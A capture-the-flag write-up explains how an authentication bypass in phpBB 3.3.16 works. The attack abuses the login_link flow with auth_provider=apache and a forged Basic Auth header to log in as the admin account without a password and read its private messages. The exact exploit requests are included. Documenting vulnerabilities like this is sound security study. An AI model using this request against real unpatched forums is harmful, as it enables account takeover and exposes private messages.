# [PHP is my passion](https://nnsc.tf/challenges?challenge=web_PHP+is+my+passion)

**Description:**

I run a phpBB forum, but it's a bit outdated. Maybe there's a well-known vulnerability that can be exploited?

## 1. Recon

The challenge description points at an outdated phpBB install. Pulling apart the provided Docker build files confirms the exact version:

```bash
curl -fsSL -o /tmp/phpbb.zip https://download.phpbb.com/pub/release/3.3/3.3.16/phpBB-3.3.16.zip
```

phpBB 3.3.16 has a known critical auth bypass, CVE-2026-48611, disclosed June 2026 and patched in 3.3.17. The `seed.php` script in the build also tells us where the flag lives: it inserts a private message titled "note to self" for `user_id = 2`, which is the forum's founder account, i.e. `admin`. So the goal is simple: get into admin's account and read their inbox.

## 2. The vulnerability

phpBB has a feature called "login link", used when connecting an external OAuth account to an existing local account. It's reached through `ucp.php?mode=login_link`. Two things about this code path make it exploitable.

First, the check that gates the whole flow is weak. It only requires that at least one `login_link_*` GET parameter be present and non-empty, no validation of its content:

```php
foreach ($var_names as $var_name) {
    if (strpos($var_name, 'login_link_') === 0) {
        $login_link_data[$key_name] = $request->variable($var_name, '', false, ...GET);
    }
}
```

Any junk value like `login_link_x=1` satisfies this.

Second, and this is the actual bug, the code trusts an attacker-supplied `auth_provider` parameter instead of hardcoding it to `oauth`:

```php
$auth_provider = $provider_collection->get_provider($request->variable('auth_provider', ''));
```

phpBB ships several provider classes. One of them, `apache.php`, is meant for setups where an Apache reverse proxy has already authenticated the user via HTTP Basic Auth, and phpBB just trusts whatever username comes through in the `PHP_AUTH_USER` header. Its login logic:

```php
if (!empty($php_auth_user) && !empty($php_auth_pw)) {
    if ($php_auth_user !== $username) { return ERROR }
    // look up user by username
    if ($row) { return LOGIN_SUCCESS; }   // no password check
}
```

It checks that `PHP_AUTH_USER` matches the submitted username, looks the user up in the database, and returns success. There's no password verification anywhere in this path, because the design assumes Apache already did that work upstream. But nothing stops a client from calling this provider directly through the `login_link` flow and just sending the `Authorization: Basic` header itself. The "trusted proxy" becomes whatever the attacker wants it to be.

Chained together: hit `mode=login_link` with `auth_provider=apache`, add a dummy `login_link_*` param to pass the empty check, send Basic Auth for the target username, and you're logged in as that user with no password required.

## 3. Building the request

There's one gotcha. The normal login form uses fields named `username` and `password`. The `login_link` flow renders a completely different template, which uses different field names, `login_username` and `login_password`. This is set explicitly in `ucp_login_link.php`:

```php
'USERNAME_CREDENTIAL' => 'login_username',
```

Reusing the field names from a captured normal login request won't work here, the server-side code is reading different POST keys and will treat the username as empty.

The final exploit request:

```
POST /ucp.php?mode=login_link&auth_provider=apache&login_link_x=1 HTTP/2
Host: php-is-my-passion-93400ea376c3.chall.nnsc.tf
Authorization: Basic YWRtaW46eA==
Content-Type: application/x-www-form-urlencoded

login_username=admin&login_password=x&login=Login
```

`YWRtaW46eA==` is base64 for `admin:x`. The password value doesn't matter, the `apache` provider never checks it, it just needs to be non-empty and the username in the Basic Auth header needs to match `login_username`.

## 4. Sending it

Send this in Burp Repeater rather than through the browser, and don't follow the redirect. The board's config has `server_name: localhost` baked in from the install step, so a successful login response redirects to `https://localhost/...`, which doesn't resolve to anything and will just error out in a browser. That redirect is irrelevant, what matters is the response headers.

A successful response looks like:

```
HTTP/2 302 Found
Location: https://localhost/index.php?sid=...
Set-Cookie: phpbb3_xxxxx_u=1; ...
Set-Cookie: phpbb3_xxxxx_k=; ...
Set-Cookie: phpbb3_xxxxx_sid=...; ...
Set-Cookie: phpbb3_xxxxx_u=2; ...
Set-Cookie: phpbb3_xxxxx_k=; ...
Set-Cookie: phpbb3_xxxxx_sid=...; ...
```

phpBB sets cookies twice in this response. Take the **last** set of `u`, `k`, and `sid` values, these belong to the authenticated session. `u=2` confirms you're now logged in as the founder account, with user_id 2 matching what `seed.php` targeted.

[SCREEN01]

## 5. Reading the flag

Using the cookies from the last `Set-Cookie` block, request the PM inbox directly, no need to click through the UI or deal with the broken redirect:

```
GET /ucp.php?i=pm&folder=inbox&sid=sid_from_step_4 HTTP/2
Host: php-is-my-passion-c96a50f84cdf.chall.nnsc.tf
Cookie: phpbb3_xxxxx_u=2; phpbb3_xxxxx_k=; phpbb3_xxxxx_sid=sid_from_step_4
```

The response to this request is the inbox page, and now that the request is authenticated as admin, it shows one unread message: "note to self", from admin, to admin, matching `seed.php` exactly. It links to `./ucp.php?i=pm&mode=view&f=0&p=1`.

```
GET /ucp.php?i=pm&mode=view&f=0&p=1&sid=<sid_from_step_4> HTTP/2
Host: php-is-my-passion-c96a50f84cdf.chall.nnsc.tf
Cookie: phpbb3_xxxxx_u=2; phpbb3_xxxxx_k=; phpbb3_xxxxx_sid=<sid_from_step_4>
```

Requesting that with the same cookies opens the message body:

[SCREEN01]
